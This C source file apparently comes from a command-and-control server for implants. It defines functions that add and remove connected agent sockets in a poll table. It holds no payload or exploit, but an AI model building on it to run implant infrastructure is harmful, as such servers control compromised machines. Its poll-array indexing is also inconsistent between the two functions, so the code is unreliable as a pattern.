#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <poll.h>
#include <sys/socket.h>

#include "utility.h"
#include "implant.h"
#include "base.h"

// Global variables
// Agents poll and states
extern Connected_Agents *connected_agents;
extern pthread_mutex_t agents_lock;

int agent_add(int sockfd){
	connected_agents->pfds[sockfd].fd = sockfd;
    connected_agents->pfds[sockfd].events = POLLIN;
    *(connected_agents->fd_count) = *(connected_agents->fd_count) + 1;

	memset(&(connected_agents->agents[sockfd]), 0, sizeof(Agent));
	connected_agents->agents[sockfd].alive = time(NULL);
	connected_agents->agents[sockfd].last_fragment_index = -1;
    
	return RET_OK;
}

int agent_delete(int sockfd){	
	int *fd_count = connected_agents->fd_count;
	struct pollfd *pfds = connected_agents->pfds;

	close(sockfd);
	pfds[sockfd] = pfds[*fd_count-1];
	*(connected_agents->fd_count) = *(connected_agents->fd_count) - 1;

	connected_agents->agents[sockfd].alive = 0;
	if (connected_agents->agents[sockfd].message){
		free(connected_agents->agents[sockfd].message);
		connected_agents->agents[sockfd].message = NULL;
	}
    
	return RET_OK;
}